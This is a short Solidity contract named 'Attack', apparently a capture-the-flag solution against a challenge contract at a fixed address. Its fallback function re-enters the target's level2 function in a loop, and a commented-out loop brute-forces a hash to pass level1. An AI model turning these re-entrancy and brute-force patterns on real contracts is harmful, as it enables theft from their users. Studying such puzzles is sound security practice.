// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./IChalenge.sol";
contract Attack {
    IChallenge public challenge = IChallenge(0xb8D00Dd38607Da3C0096eEFCa4FA1CAAcc5eaB58);

    uint16 hel = 1;

    function lvl1() external {
         challenge.level2("roqbell");

        // for (uint16 i = 0; i <= 65535; i++){
        //     if(keccak256(abi.encode(i)) == 0x913abd2fa66769e4601c20cd3bdea32afc207bfdd6b85faa2b3c5ee7e9317727) {
        //         challenge.level1(i);
        //     } 
        // }
    }

    // function lvl2() external {
        
    // }

    fallback() external {
        while (hel < 4) {
            hel = hel + 1;
            challenge.level2("roqbell");   
        }
    }
}